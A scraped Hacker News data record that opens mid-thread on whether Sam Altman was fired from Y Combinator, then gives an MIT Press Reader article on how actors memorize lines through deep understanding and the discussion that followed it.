The manager of the manager of the lowest level workers has no contact with the workshop reality. They live in the PowerPoint world with hockey stick growth slides and ideal project plans. There were exemptions, but very rare. One level above has absolutely no touch with reality without any exemptions. Some of them were able to participate in meetings from the shower with enabled camera in the pastâ€¦ I doubt these are working hard. reply ldjkfkdsjnv 2 hours agorootparentprevYup! Most people never fully grasp the extent to which this is true reply davedx 8 hours agorootparentprevThis is nonsense. I know CEOs and they are not â€œleisure classâ€, managing the running of a company and executing on strategy is an endless job. Sure some CEOs might drop out and play golf, but all that proves is you have slackers at any level of an org reply DavidPiper 8 hours agoprev- (PG/YC) Assuming that someone who is (or is about to be) the CEO of a different company won't have time to 100% commit to your own company and planning accordingly seems like a reasonable position. - (SA) The new CEO of a company wanting to commit as much of their time as possible to that company also seems like a reasonable position. reply tasty_freeze 3 hours agoprevI don't have a twitter account and generally avoid links to it unless I really care what apparently is on there. Is it normal that people will post an image of text of what they want to say vs just typing it directly into twitter? reply paxys 3 hours agoparentIt used to be a lot more prevalent when Tweets had a 160 character limit, but yes people still do it now. reply dartos 5 hours agoprevIâ€™ve never seen HN so thirsty over celebrity tea before. reply throwitaway222 4 hours agoprevYes but why not tweet this months ago reply barbazoo 2 hours agoprevUnrelated but I'm curious. Why do people often post pictures of text instead of the actual text on twitter? reply esafak 42 minutes agoparentThe practice came about when Twitter had a brief length limit, and persisted. reply fairity 2 hours agoprevMost of the conversation in this thread consists of people talking past each other bc they aren't aligned on the definition of the word: fired. Yes, there's a way to define the word \"fired\" such that PG did fire Sam. But, that definition is not the colloquial definition of the word \"fired\". Just go outside on the street, and ask someone: \"My boss just told me that I need to stop working on my side project to keep working at his company. Would you say I just got fired?\" The answer 95%+ of the time will be no. So, while I can understand why you might argue that PG fired Sam, if you can't understand why PG claims that he did not fire Sam, you simply have your head buried in the sand. reply tptacek 2 hours agoparent100% of the time the answer will be noâ€ . He simply wasn't fired. â€  Note key proviso: \"going outside\" reply bradlys 1 hour agoparentprev> The answer 95%+ of the time will be no. This is where I think everyone will disagree with you. I don't know anyone who would agree with your statement. Most people I know would agree that you're being fired when your terms of continued employment change drastically in such an unfavorable way. If my boss told me, \"Hey, you can keep working here as long as you work for free\" then that's being fired but by your definition - it's not. reply mort96 8 hours agoprevThe comments here and on Twitter are really weird. I don't like the guy either but surely anyone has to agree that there's a difference between being told, \"We don't want you on as CEO anymore\", and being told \"We want you as CEO but we need a CEO who's only focused on one company\"? It seems weird to describe the situation where Altman is asked to choose and chooses OpenAI as \"he was fired from YC\". reply tivert 5 hours agoparent> The comments here and on Twitter are really weird. I don't like the guy either but surely anyone has to agree that there's a difference between being told, \"We don't want you on as CEO anymore\", and being told \"We want you as CEO but we need a CEO who's only focused on one company\"? It seems weird to describe the situation where Altman is asked to choose and chooses OpenAI as \"he was fired from YC\". But maybe not as big a difference as some make it out to be. A PIP is technically a statement of \"we want you to be an employee, but we need you to change X to stay,\" but someone doesn't meet the PIP requirements you'd still say they were fired. reply mort96 5 hours agorootparentIf someone can't meet the PIP requirements, then they're fired. If someone could easily meet the PIP requirements, but decides to leave instead, then they left. In my mind, the entire question is about who has agency. reply bradlys 1 hour agorootparentA PIP is almost always a formal nothingburger as a paperwork enforced means to get someone fired. Very often the goals of PIPs are either ridiculously high or nonsensically vague as to be interpreted in whatever way that would please the person doing the firing. It gives a false sense of \"agency\" for the employee. In reality, the employee was already fired 3 months ago in the mind of the manager. reply mort96 15 minutes agorootparentRight. So there's no real agency, so it's a firing. Unlike the case where you're just asked which of the two companies you want to be CEO of. reply falcor84 8 hours agoparentprevThere is definitely a difference to discuss, but simplified it still states \"Unless you change your behavior, you need to go\", as suck, I don't feel that \"fired\" is inaccurate. reply mort96 8 hours agorootparentThis feels reductive. He was asked to choose between two jobs, and told that he couldn't have both. He chose one of them. Describing that as being \"fired\" is whack. \"He was fired for choosing to work somewhere else instead of here\", really? reply yurishimo 7 hours agorootparentIn layman's terms, we call that \"quitting\"! reply jfoster 6 hours agorootparentI would call it an ultimatum. Quitting: You decide that it's time to go. Firing: Your boss decides that it's time for you to go. Ultimatum: Choose between these options, or it's time for you to go. The only part that might not be right is the tone. I think \"ultimatum\" sounds a bit adversarial, whereas PG is describing something more cooperative in nature. reply addicted 7 hours agorootparentprevYouâ€™re not â€œfiredâ€ if you were given an option to continue in the job. reply falcor84 5 hours agorootparentHow so? If my boss tells me that I have to stop my out-of-work political activism or he he'll fire me, what would you call that? reply stefan_ 5 hours agoparentprevI suppose you also think all these executives really quit to be with their family? reply mort96 5 hours agorootparentThat's a completely different question. You're alleging that Paul is lying, which might very well be the case. I'm just saying that if everything Paul said is correct, I don't think the word \"fired\" is appropriate. reply mort96 8 hours agoparentprevLike if I say to my boss, \"Hey I want to reduce my position to 50% to spend 50% of my time working for this other company\", and they respond with \"Sorry, we don't want part-time employees\", and I respond \"ok I quit\", who in their right mind would describe that as me getting fired? reply falcor84 8 hours agorootparentDid he actually ask to reduce his position? As far as I'm aware, being a CEO is never based on hours worked, and there are plenty of other CEOs with multiple commitments. reply mort96 8 hours agorootparentThe way the tweet is phrased makes me think he was asked by the board to choose, so I guess a more appropriate analogy would be: I'm employed by a company, I start a side gig which I spend 50% of my productive time on, my boss eventually tells me that they need someone in my position to be a proper full time employee and I need to choose. I respond, \"okay, in that case I resign\". There's no difference between the two analogies in my eye, they're the same except that the first is about asking permission while the second is about just doing it. reply belter 8 hours agoparentprevBoth scenarios involve a loss of control over one's professional destiny, not by choice but by external forces... reply mort96 8 hours agorootparentAre you making the argument that \"every situation which involves losing control over one's professional destiny is by definition a situation in which one is fired\"? If so, I disagree. If not, I don't see the relevance. reply belter 8 hours agorootparent> Are you making the argument that \"every situation which involves losing control over one's professional destiny is by definition a situation in which one is fired\"? No, I am saying these two are similar. > I don't see the relevance. The relevance is that trying to pull an Elon Musk one...Has relevance to the professional ethics of the current manager of the OpenAI new safety team... reply mort96 8 hours agorootparentAha so you're saying you agree with me, calling this a firing isn't appropriate. It's just similar to a firing in that both involve not working at a place anymore. Cool reply belter 7 hours agorootparentAh..ah..nice try:-) That is like those cheating husband arguments. - You are not leaving me...I am leaving you! reply mort96 7 hours agorootparentPerson A to person B: \"Hey I love you, please stay with me but you have to choose between me and person C\" Person B: \"okay I choose person C, bye\" Person B left --- Contrast with: Person A to person B: \"I'm leaving you because you have a relationship with person C\" Person A left --- It's really not complicated, and I seriously don't understand why so many people here don't get it... whether you're fired or resigning, and whether you're the person leaving or the person being left, depends on who has the agency. If you're making the choice, you're resigning. If you have no say, you're being fired. People leave their jobs all the time because their job requires something from them that they don't want to give. That's not being fired, that's resigning. (If the job requires something which you're unable to give, such as if you're doing as good of a job as you can reasonably do but your employer requires you do better still and you're just not good enough, then you don't have the agency; you're being fired.) Now, I'm done with this conversation, if you have a counter argument then try to think hard about what I would say in response. You can handle both sides of this conversation from here. I have been clear enough. reply 172 more comments... GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Paul Graham, co-founder of Y Combinator (YC), clarified on Twitter that Sam Altman was not fired by YC, addressing and countering circulating rumors.",
      "This statement aims to dispel misinformation and provide clarity regarding Sam Altman's departure from YC."
    ],
    "commentSummary": [
      "A Hacker News discussion, sparked by a Paul Graham tweet, debunks myths about non-profit leadership, emphasizing the challenges and burnout in unpaid roles.",
      "The conversation examines Mitchell Baker's role at Mozilla and Sam Altman's departure from Y Combinator to focus on OpenAI, debating whether it was a firing or a voluntary move.",
      "The discussion highlights the complexities of managing high-responsibility roles and the nuances of public narratives surrounding high-profile career changes in tech and venture capital."
    ],
    "points": 520,
    "commentCount": 428,
    "retryCount": 0,
    "time": 1717060765
  },
  {
    "id": 40520334,
    "title": "How Actors Use Deep Understanding to Memorize Lines",
    "originLink": "https://thereader.mitpress.mit.edu/how-actors-remember-their-lines/",
    "originBody": "How Actors Remember Their Lines In describing how they remember their lines, actors are telling us an important truth about memory. Michael Caine in \"The Ipcress File\" / Photograph: BFI. By: John Seamon After a recent theater performance, I remained in the audience as the actors assembled on stage to discuss the current play and the upcoming production that they were rehearsing. Because each actor had many lines to remember, my curiosity led me to ask a question they frequently hear: â€œHow do you learn all of those lines?â€ Actors face the demanding task of learning their lines with great precision, but they rarely do so by rote repetition. They did not, they said, sit down with a script and recite their lines until they knew them by heart. Repeating items over and over, called maintenance rehearsal, is not the most effective strategy for remembering. Instead, actors engage in elaborative rehearsal, focusing their attention on the meaning of the material and associating it with information they already know. Actors study the script, trying to understand their character and seeing how their lines relate to that character. In describing these elaborative processes, the actors assembled that evening offered sound advice for effective remembering. This article is excerpted from John Seamonâ€™s book â€œMemory and Movies: What Films Can Teach Us About Memoryâ€œ Similarly, when psychologists Helga and Tony Noice surveyed actors on how they learn their lines, they found that actors search for meaning in the script, rather than memorizing lines. The actors imagine the character in each scene, adopt the characterâ€™s perspective, relate new material to the characterâ€™s background, and try to match the characterâ€™s mood. Script lines are carefully analyzed to understand the characterâ€™s motivation. This deep understanding of a script is achieved by actors asking goal-directed questions, such as â€œAm I angry with her when I say this?â€ Later, during a performance, this deep understanding provides the context for the lines to be recalled naturally, rather than recited from a memorized text. In his book â€œActing in Film,â€ actor Michael Caine described this process well: You must be able to stand there not thinking of that line. You take it off the other actorâ€™s face. Otherwise, for your next line, youâ€™re not listening and not free to respond naturally, to act spontaneously. This same process of learning and remembering lines by deep understanding enabled a septuagenarian actor to recite all 10,565 lines of Miltonâ€™s epic poem, â€œParadise Lost.â€ At the age of 58, John Basinger began studying this poem as a form of mental activity to accompany his physical activity at the gym, each time adding more lines to what he had already learned. Eight years later, he had committed the entire poem to memory, reciting it over three days. When I tested him at age 74, giving him randomly drawn couplets from the poem and asking him to recite the next ten lines, his recall was nearly flawless. Yet, he did not accomplish this feat through mindless repetition. In the course of studying the poem, he came to a deep understanding of Milton. Said Basinger: During the incessant repetition of Miltonâ€™s words, I really began to listen to them, and every now and then as the poem began to take shape in my mind, an insight would come, an understanding, a delicious possibility. In describing how they remember their lines, actors are telling us an important truth about memory â€” deep understanding promotes long-lasting memories. A Memory Strategy for Everyone Deep understanding involves focusing your attention on the underlying meaning of an item or event, and each of us can use this strategy to enhance everyday retention. In picking up an apple at the grocers, for example, you can look at its color and size, you can say its name, and you can think of its nutritional value and use in a favorite recipe. Focusing on these visual, acoustic, and conceptual aspects of the apple correspond to shallow, moderate, and deep levels of processing, and the depth of processing that is devoted to an item or event affects its memorability. Memory is typically enhanced when we engage in deep processing that provides meaning for an item or event, rather than shallow processing. Given a list of common nouns to read, people recall more words on a surprise memory test if they previously attended to the meaning of each word than if they focused on each wordâ€™s font or sound. Deep, elaborative processing enhances understanding by relating something you are trying to learn to things you already known. Retention is enhanced because elaboration produces more meaningful associations than does shallow processing â€” links that can serve as potential cues for later remembering. For example, your ease of recalling the name of a specific dwarf in Walt Disneyâ€™s animated film, â€œSnow White and the Seven Dwarfs,â€ depends on the cue and its associated meaning: Try to recall the name of the dwarf that begins with the letter B. People often have a hard time coming up with the correct name with this cue because many common names begin with the letter B and all of them are wrong. Try it again with a more meaningful cue: Recall the name of the dwarf whose name is synonymous with shyness. If you know the Disney film, this time the answer is easy. Meaningful associations help us remember, and elaborative processing produces more semantic associations than does shallow processing. This is why the meaningful cue produces the name Bashful. John Seamon is Emeritus Professor of Psychology and Professor of Neuroscience and Behavior at Wesleyan University. He is the author of â€œMemory and Movies: What Films Can Teach Us About Memory,â€ from which this article is excerpted.",
    "commentLink": "https://news.ycombinator.com/item?id=40520334",
    "commentBody": "How actors remember their lines (mitpress.mit.edu)417 points by pepys 13 hours agohidepastfavorite132 comments jnordwick 5 hours agoI've taken some Meisner technique workshops, and this is what changed my view of acting: > â€œActing is the ability to behave absolutely truthfully under the imaginary circumstances.â€ The Meisner Technique is a brick-by-brick process designed to get you out of your head and into your gut. For that to happen, you must learn to put your focus and attention on the most important thing: the other actor.\" Actors under this don't pretend, they are. A lot of actors will practice their lines with just reading and reciting, no attempt at tone or inflection -- just flat recitation -- because if you aren't responding to the other actors you are just pretending. A lot of the warmup exercises are based around just responding to the other person in front of you. And they are a great way to get better at talking to people -- that's why I took the classes. Stella Adler has a great quote: \"Growth as an actor and as a human being are synonymous.â€ I find it so much easier to remember lines with the other person in front of me - I don't memorize random facts well. They always have a connection to something else and I have hop from stone to stone of thoughts sometimes to remember what I was trying to sometimes. reply gottorf 3 hours agoparent> you must learn to put your focus and attention on the most important thing: the other actor. Famously, Sir Ian McKellen had an emotional breakdown while filming The Hobbit due to extended stretches of talking not to other actors, but a greenscreen. reply anigbrowl 2 hours agorootparentEven without greenscreen, actors in film and TV have to split their attention in unnatural ways. To preserve eyeline continuity in close-ups, actors often have to address themselves to a tennis ball or something near the camera lens, while their partner in the scene stands behind the camera. In the worst case scenario, sometimes the other actor is not even there when the closeups are being shot. reply burningChrome 43 minutes agorootparentI remember an interview with Chevy Chase who said Dan Aykroyd was an expert at this and he said he was able to read cue cards out of his peripheral vision when they were at SNL so he could read lines without turning his head in the direction of the car holder. Chevy said he never met any actor that could do it as easily as Aykroyd could. reply IndySun 41 minutes agorootparentprevIt was distinctly more of an outburst of anger and frustration with the green screen rather than an 'emotional' breakdown. I wasn't there but a colleague was. See what you did? Now all those replies to your skewed sentence are voided! reply sandworm101 2 hours agorootparentprevBecause he is a Stanislavski-type method actor. He struggled because he, internally, was processing those emotions. Other actors do not do this. Think of a model posing for a photo shoot. They don't alternate between being happy/sad/pouty on command. They alternate between those looks without processing any underlying emotion. Watch some standup comedians. They can repeat the same joke down to every intonation and body twitch night after night. So too a dancer in a chorus line. They are not processing emotion when they do this, rather their external appearance is a total fraud disconnected from their actual emotional state. McKellen is acting from the inside out, from an internal emotion to the portrayal of that emotion externally. Others are good at just portraying emotion without that internal process, acting \"from the outside out\" as a Kabuki artist might. reply Aloisius 9 minutes agorootparentIan McKellen isn't a Stanislavski-based actor. He's classically trained. He broke down because it's simply hard. reply echelon 1 hour agorootparentprevThis is an inaccurate characterization of acting. Nearly every school of acting shuns the manufacturing of feeling. It's incredibly easy to spot a bad actor, because manufactured emotions are uncanny. For example, Meisner teaches you to live truthfully in the moment. The emotion you feel is based off of what you're getting from your partner in that exact moment. You're taught to get rid of ingrained social firewalls and just let everything out. To actually feel the other actors and show them how they're impacting your emotional state. It's 100% real and authentic from moment to moment. reply sandworm101 1 minute agorootparentI think you may have narrowed your definition of \"acting\" to only that taught at western acting schools, the type geared for the western stage. Acting is far broader. Take an army drill instructor getting apparently angry at a new cadet. They are not actually angry, not at any level. They are skilled at projecting false anger without actually ever being angry internally. They look psychopathic because they can turn this on and off instantly, but they aren't crazy because they aren't actually turning any emotion on and off, only the fake external image of emotion. That is still acting. What maters is the external message, not how you get there. EGreg 1 hour agorootparentprevThis is literally what AI is doing Trusting AI is impossible because it can have a backdoor and easily switch on a dime at any time, violating all your assumptions (that are made because of your intuitions about living animals and their costly signals) NO MATTER HOW LONG IT HAS BEEN EARNING YOUR TRUST. Not only that, but it can actually do it in the background, imperceptibly, across thousands of instances, and shift opinion of many people. The movie Her shows that Samantha had been speaking to thousands of people at once. The abrupt leaving is actually a very benign scenario, compared to the myriad other things it could abrutly change. https://www.youtube.com/watch?v=GZS8xBvgLaQ reply daveguy 37 minutes agorootparentAI literally does none of that. The current state of AI has no comprehension of any other conversation, only the output of a numerical model and the context / system prompt entered. AI has no motivation or ability to \"earn trust\". The end result is the same though -- you can't trust it past what you can verify. reply throw4847285 3 hours agoparentprevYou reminded me of the Meisner workshop scene in Asteroid City (you can't wake up if you don't fall asleep). The more I think about it, the more the Meisner Technique seems like a central theme of the whole movie. The scene with Margot Robbie and Jason Schwartzman drives home the difference between recitation and acting. Cool stuff. reply quartesixte 11 hours agoprevThis resonates. As a frequent public speaker and coach of others in public speaking, the top priority is to just deeply understand the material. The second priority is to create the habit write like you publicly speak (i.e develop a style). You put these together, and you have no choice but to explain it the way youâ€™d have written it anyways. This enforces resilience against interruptions and allows for improvisation. But this is hard. It requires two great efforts: to deeply understand the material, and to craft a speaking/writing habit that makes for powerful, public speaking. It doesnâ€™t surprise me then, that actors do the same. reply boerseth 10 hours agoparentI am reminded of Socrates, who lamented the practice of memorization being replaced with writing. Today one might dismiss this idea as silly, since memorization alone is frequently associated with dumb parroting and regurgitation, neither of which imply any depth of understanding. But from this discussion, we see the old man may have been on to something! If understanding something deeply is necessary in order to memorize it well, then one might achieve understanding as a secondary effect by aiming to memorize something by heart. reply loughnane 7 hours agorootparentMemorization def gets a bad rap, for the reasons you mention. Yet I bet most folks who have memorized a poem or a passage---out of an affinity for it, not when demanded by a teacher---know the value. Memorizing something means you can roll it around in your head whenever you want, think about it from this perspective or that, and let the brain really absorb the ideas the words express. It's good. reply sizzzzlerz 4 hours agorootparentI totally agree. I've spent time learning several poems of Robert Service (The Cremation of Sam McGee, The Spell of the Yukon, The Men Who Don't Fit In) because I've enjoyed reading them. Now, I don't need a book, I just recall one from memory any time I like. I'm not an actor so I had none of the techniques that they would use to learn lines. It was purely rote memorization through repeated readings and recitation. reply freedomben 3 hours agorootparentprevI agree, but I think it does depend on what the objective is. If preserving the literal accuracy of the source material is important, then memorization deserves it's bad rap and is worthy of much criticism. That's not to say that people can't memorize things accurately (there are plenty of kids who memorize Bible and Quran verses verbatim for example that can easily disprove that), but memories are fallible in ways that writing isn't, particularly when it comes to comparing sources for accuracy or historical value. On the other hand, if the objective is to understand and appreciate the source, even simply for personal edification or enlightenment, then I agree completely: memorization is a wonderful technique for doing so. reply eru 9 hours agorootparentprev> If understanding something deeply is necessary in order to memorize it well, then one might achieve understanding as a secondary effect by aiming to memorize something by heart. I heard there are people who memorise the Quran without knowing the slightest bit of Arabic? And there's also the Kiwi chap, Nigel Richards, who memorised the whole French Scrabble dictionary in order to win the French world Scrabble championship, without learning any French in the process. (Whether you call what he did to the French word list 'understanding' is up for debate, I guess. I am fairly sure he went much deeper into understanding the underlying probability distributions of letters in French words than most speakers, but he couldn't read a newspaper.) reply n4r9 7 hours agorootparentI went to a Saturday school for many of my childhood years, as my dad wanted me to learn Arabic. They were bad at teaching the language, but did get us to read the script and memorise several Quran verses. You were supposed to get \"rewards\" in heaven just for memorising without understanding. To this day I can recite Al-Fatiha [0] despite not understanding a word, being an atheist, and not having prayed for maybe 15 years. [0] https://myislam.org/surah-fatiha/ reply freedomben 3 hours agorootparentSame, as a kid there were a whole bunch of bible verses to memorize, which was required. To this day I can recite quite a few of them, and (despite now being an atheist) I still occasionally have some of them pop into my head in situations where it might be relevant. Memorization is an extremely powerful tool, and particularly religions have known and used this for millenia. reply rokhayakebe 4 hours agorootparentprevI heard there are people who memorise the Quran without knowing the slightest bit of Arabic? True, I am doing this myself. 4 days a week and plan to continue for the next 10 years. Memorized several pages so far with a lot more to go without understanding any of it. reply bratwurst3000 4 hours agorootparentMay I ask why? I as an atheist did memorize some part of the Bible for the fun of it but I understand the language. reply angra_mainyu 3 hours agorootparentIn Islam there's a certain reverence for memorizing the Quran, unlike in Christianity. In fact, being a Hafiz or your child being a Hafiz is a point of pride. This in part goes back to Islamic lore/history. Another part is that there is the belief that there are rewards associated with, being accompanied by angels iirc. reply rokhayakebe 2 hours agorootparentprevBecause it is important to me as a Muslim. Also it is challenging, interesting, to try and memorize an entire book. reply foolswisdom 6 hours agorootparentprevIt's possible to just memorize the words, of course. But for myself, I find that very tedious and difficult to make myself do (nor very worthwhile), and much prefer becoming deeply acquainted with the text in order to memorize it. reply eru 6 hours agorootparentYes, understanding can help memorisation. I was merely arguing against understanding being _necessary_. reply ralferoo 2 hours agorootparentMemorisation without understanding often ends up producing things like Mariah Carey's classic hit \"Ken Lee\". reply telesilla 7 hours agorootparentprevThis extraordinary book from Frances Yates explains how before writing, scholars and story tellers would visualize architecture so they could store memories in rooms, then they would walk from room to room and recover memories, for example to tell very long stories. https://en.wikipedia.org/wiki/The_Art_of_Memory reply wanderingstan 5 hours agorootparentAlso covered in the more contemporary book Moonwalking with Einstein with its discussion of building oneâ€™s own â€œmemory palace.â€ reply never_inline 6 hours agorootparentprevWorth noting that India's oldest poetic/litergical traditions, the Vedas, were transmitted orally for at least 1500 years, and developed elaborate systems of memorization and pronounceation to ensure they passed down (almost) unmodified. reply rokhayakebe 4 hours agorootparentIn Mauritania there is a village where most people who lived there are blind. This is how they learn to memorizw the Quran which is more than 600 pages, each have 15 lines. reply BurningFrog 5 hours agorootparentprevI'm sure it's a tradeoff. Like adding a disk to a computer that only had RAM. You have access to many orders of magnitude more data, but it is substantially slower to access it. All considered, I'm glad we did the upgrade. reply teleforce 5 hours agorootparentprevFun facts, there is an important Islamic tradition where group of people (tens or hundreds thousands of them) called Hafiz memorize the entire Quran. If for example, God forbid, that the entire written copies either physicallly or digitally of the Quran are completely destroyed, it can be recreated completely in no time. This practice is considered a living miracle since no other holy book has this crucial feature and it is also well known that even the Pope do not memorize the complete Bible. reply mminer237 4 hours agorootparentThe Bible is about ten times the length of the Quran though. Some people like John Goetsch and Tom Meyer currently have most of it memorized nonetheless, but Christians largely believe that God will supernaturally preserve the Bible no matter what, so memorization is just for personal betterment and to better share it with others. reply follower 2 hours agorootparent> but Christians largely believe that God will supernaturally preserve the Bible no matter what You know, until you put it in this context, it hadn't occurred to me how--from some perspectives--\"convenient\" that is. :) reply Salgat 4 hours agorootparentprevTo add, Jesus only commanded the spread of the Gospel, and not the books or writing, but rather just teaching about Jesus and how he provides salvation through his sacrifice. reply BizarroLand 2 hours agorootparentAfter all, the point is not that a certain selection of appropriate texts be considered the end all and be all of existence, but rather that the Bible is supposed to be a history of what other people did while under Gods rule during their lives so that you can get an idea of how to live under Gods rule in your life. People get hung up on the dead past rather than the living present. They say God is unchanging and eternal and neglect that he built an ever-changing universe of entropy for us to live in. Even the \"Gospel\" means \"Good News\" or \"Glad Tidings\". What good news comes from 2,000 year old texts? It's not news at this point, it's history. The Good News comes from people today choosing to be better, to do better, to not oppress, to not commit evil acts against others but to do good things to other people, to say kind words from a good heart because they believe in a better world coming tomorrow. reply rsaz 2 hours agorootparentprevThe Guru Granth Sahib Ji (GGSJ) has also been memorized by some people. Itâ€™s much rarer than in Islam, but the GGSJ being written in verse with defined melodies/meter helps with memorization. It is much longer than the Quran though, and there isnâ€™t as much emphasis on memorizing the whole thing (the daily prayers are commonly known though). reply HumblyTossed 4 hours agorootparentprevI sincerely hope this doesn't get taken the wrong way but this seems like a worldly solution to a Godly problem. Is the God in the Quran not sovereign? Why would He need humans to protect the Quran? Again, not a critique, just a curiosity. reply dasil003 4 hours agorootparentBecause even when youâ€™re all powerful, itâ€™s hard to find good help reply Pamar 4 hours agorootparentprevNitpicking Alert!!! The Pope Should be more concerned about the Gospel, I think. reply xattt 5 hours agorootparentprevSimilar to how using flash cards doesnâ€™t really help in developing that deep understandingâ€¦ but the action of making them sure does. reply DowagerDave 4 hours agorootparentprevand further complicating the situation is people like me who write not to re-read, but understand, which then helps to memorize. Circle complete! reply stdbrouw 10 hours agoparentprevI'd add to those the necessity to have some distance from the material to avoid the recency effect. You can have that distance either because you'll be talking about something you haven't worked on for at least a couple of weeks, or because you've developed an ability to retain a birds eye view and adopt an outsider's perspective even when you're in the weeds. A lot of academic talks go wrong because, although the speaker deeply understands their topic, that teeny tiny detail that they were fiddling with yesterday is really not the thing they should try to communicate today, but they can't help themselves. Yet ask that same person to talk about their previous work, and you'll get a high quality impromptu introduction to the field. reply flkiwi 5 hours agoparentprevA few years ago, I came into the orbit of a public speaking coach, and he and I worked together for a few weeks. Your comment fascinates (and reassures) me, because he was emphatic that I had to abandon my own natural way of speaking entirely, and adopt a \"persuasive persona\" that sounded to me like a Saturday Night Live parody of a TED talk. This has exactly the opposite of the intended effect, because any anxiety I felt about speaking was multiplied by my anxiety about how I sounded and \"staying in character\". By comparison with the linked post, however, I was attempting to stay in a character that I didn't understand, with no thought given either to understanding what I was saying or, crucially, understanding who I was speaking to. This got me thinking about the people who find value in his style, and I realized that the consistent feature was that they didn't care about understanding the material and, in some cases, were so incapable of doing so that the notion wouldn't occur to them. Not dumb, just not interested. They were simply transactional, and almost always very, very scared of talking in public, and this coach's method allowed them to get through it. This also helped me realize that I don't particularly suffer from stage fright or public speaking anxiety, which has been a benefit, though it's important to note how insignificant that actually is. A family member has worked on stage with some extremely successful actors, and it's REMARKABLE how many of them have absolutely crushing stage fright. To me, that's more interesting than the line-learning thing: you take a person, someone most people in this thread would have heard of, and imagine them hiding out in a bathroom because their terrified of going onstage, then they get out there and utterly blow the room away. Something about pretending to be someone else unlocks so many actors. This ties right back to my friction with this public speaking coach, because he was attempting to coach me into playing pretend, though without any empathy or understanding. So this guy is producing two categories of students: people like me who want to understand the material and the audience and simply speak like a better version of ourselves, and people who sound like they're selling you a car they've never driven but doing so competently, checking more \"good public speaker\" boxes at a superficial level. I'm guessing the great actors and public speakers do both: love the material AND love the act of becoming a person you want to listen to. reply quartesixte 3 hours agorootparentYeah I heavily disliked most public speaking coaches at institutions precisely because of this. FWIW, I mostly coach juniors at work who will brilliantly describe their current project to me at their desk but then fall apart in the conference room in front of peers and seniors. Mostly it's because they're trying to recite some prepared speech that doesn't sound like they normally talk (often desperately trying to impress the room). So I tell them their mastery of the material will impress the room and you sound plenty fine when explaining it to me at your desk. I don't have a full semester of instruction time to make them develop a style -- I have one hour the day before the meeting. So it doesn't produce great political orators. But it does help produce people who can walk through some deep technical work in front of their bosses. >AND love the act of becoming a person you want to listen to. And love that character too. That takes some self discovery, experimentation, and practice. Which is why I referred to it as a great effort. Addendum: To give some credibility to my method, I often point out to them that they sound their best when speaking during data reviews. These are sessions where, following some kind of test, engineers gather to review sensor outputs. You have no time to prep a speech -- these are quickly assembled within hours of a test and are very much often just a loose collection of screenshots and quick annotations and the engineer in question usually spends that time copy pasting screenshots or driving back from a test site. But once it's their turn to talk about some really obscure looking line graph, they will deliver some great, great public speaking. Why? They've spent the last 6 hours staring at this graph and know deeply how to interpret it. By the way, this has given me reason to believe that Investment Banking decks largely are just to force junior associates to undergo the above process. reply gedy 3 hours agorootparentprev> This ties right back to my friction with this public speaking coach, because he was attempting to coach me into playing pretend, though without any empathy or understanding. This is my experience as well, and ironically mirrors my time as a manager. I want to understand and empathize with people, and there are managers and orgs who absolutely don't want that, and want the \"people who sound like they're selling you a car\" reply bowsamic 9 hours agoparentprevThis doesnâ€™t make much sense: actors donâ€™t write their material, they are given it. They canâ€™t write like they speak, and also they canâ€™t improvise reply quartesixte 3 hours agorootparentFor actors it's slightly different, but the whole \"becoming the character\" part is, to me, the \"writing like they speak\" part. By fully inhabiting the character, they will be compelled to speak in the manner written in the given situation. And as the other comments mention, actors very often do alter the lines. Behind the scenes footage and interviews with actors reveal this often happens because they think the screenwriter/director got it wrong in that particular moment -- that their character wouldn't respond like that. The Han Solo example is a good one. Hours of takes saying \"I love you too\" and then Harrison Ford has a flash of clarity and realizes Han would NEVER respond like that. Calls for a quick take, \"becomes Han Solo\", says \"I know\" and the rest is history. reply coldtea 7 hours agorootparentprevActors (especially big names) can and do improvise all the time, in almost all movies. It's rare they say all lines exactly as in the script. In fact often the script gets updated with ideas that came up during shooting including improvised lines. reply assimpleaspossi 2 hours agorootparentJust because you hear that they do, doesn't mean it's always allowed or that it will make it into the film. Sometimes a line just isn't working and an actor or the director or the writer or a grip will come up with something that works and that's what you hear about. Those are exceptions and not the rule. The director has the final say. Often others higher up have the final say. If he wants you to say the line as written, you will say the line as written. reply flkiwi 4 hours agorootparentprevA fascinating topic around my family is the playwrights who insist that the play be delivered precisely as written, most of whom are the same playwrights who refuse to allow genderswapping roles (even innocuously), updating pop culture references, etc. They are not the norm, and pretty much everyone understands that performance is as much a part of the creative act as writing, with all the deviations and imperfections that suggests. And that's without even getting to the idea of consciously changing the script midstream that you mentioned. reply etse 4 hours agorootparentprevHarrison Ford says, \"I know,\" instead of \"I love you, too\" (or something like that) in Empire Strikes Back's carbonite freezing scene. That's an immensely significant and meaningful update. reply breakfastduck 4 hours agorootparentprevIf you watch any side by side of a film audio / final and the script you'll realise what you're saying simply isnt true. It's very rare that a conversation scene mirrors the dialogue exactly 1 to 1. Obviously there will be certain lines where the director wants exact delivery but actors very often deliver a slightly different line than as written. If anything this frequency increases the higher level of profile / skill the actor has. There are countless examples where a director is asked about scenes and defers the credit to the actors for improvising something particularly well or coming up with a better line to convey the same point - they are the ones, after all, in charge of personifying the character that was written. They may feel a different delivery suits the character better. reply watwut 7 hours agoparentprevI don't understand what does the \"writing and speaking should be the same\" thing is supposed to achieve for public speakers. reply coldtea 7 hours agorootparentIt means that if your speech is written in the way you casually speak, it's easier to remember it (since you'll not have to remember fancy words or turns of phrase that you wouldn't normally use). The idea being that it's easier to remember or reconstruct speech that comes natural anyway. It will also be easier to improvise and fit the tone if you forget what you were supposed to say. Aside from the above, which are about memory, it's also good for making it natural: you'll sound more authentic/natural speaking as you normally do, than trying some fancy speech, and it will also be easier to add off the cuff remarks that also fit the tone, like an idea that occured in the moment, or to respond to something that happens just before/while speaking. reply QuantumGood 1 hour agoprevI've trained voice actors for over 20 years, and the visual cortex being constantly activated as you are forced to stare at the words is a major problem for most actors. We have a variety of techniques for helping with this, but the one that works the best is \"micro memorization\": take a single sound group (linguistically, a speech chunk) of 2-6 words and repeat them with eyes closed. Anything longer and a small bit of anxiety (\"am I remembering the words correctly?\") creeps in and destroys naturalism. Eventually, the brain becomes attenuated to sharing meaning, not just words, and that becomes a habit that can be used when warming up a script you've never seen before. Also, just as a single multi-syllabic word follows a pitch and stress pattern, so do individual speech chunks. Speaking each chunk in the most natural /default pattern is difficult to learn to let happen naturally, and this exercise also builds skill in that area. reply davidrupp 27 minutes agoprevI recently was asked to take over the role of Deputy Governor Danforth in The Crucible a week before opening. I accomplished it -- barely -- largely through rote memorization. Yes, I also had to 